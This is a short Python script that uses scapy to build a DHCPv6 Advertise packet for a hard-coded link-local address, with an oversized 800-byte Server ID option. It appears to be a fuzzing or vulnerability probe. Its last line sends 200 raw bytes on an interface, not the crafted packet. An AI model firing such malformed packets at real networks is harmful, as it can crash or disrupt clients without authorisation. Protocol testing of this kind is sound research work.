#!/usr/bin/env python
# encoding: utf-8

# pycharm 无法识别 scapy 符合的原因
# https://stackoverflow.com/questions/45691654/unresolved-reference-with-scapy/53402404#53402404
from scapy.layers.inet import UDP
from scapy.layers.dhcp6 import *
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether
from cpf.misc.utils import hexdump
from time import sleep

sol = DHCP6_Solicit()
adv = DHCP6_Advertise()
opreq = DHCP6OptOptReq()
et = DHCP6OptElapsedTime()

duid = "00010001236be812000c292038db".decode("hex")
cid = DHCP6OptClientId(duid=duid)
sid = DHCP6OptServerId(duid=duid)
sid.add_payload("s" * 800)

iana = DHCP6OptIA_NA(iaid=0xdeadbeef, ianaopts=DHCP6OptIAAddress(addr="fe80::431a:39d4:839d:215c"))

l2 = Ether(src="00:0c:29:27:59:f1")
l3 = IPv6(dst="fe80::431a:39d4:839d:215c", src="fe80::847:8219:1871:5a0f")
l4 = UDP()
pkt = l2 / l3 / l4 / adv / iana / cid / sid

sendp(Raw('x' * 200), iface='ens38')
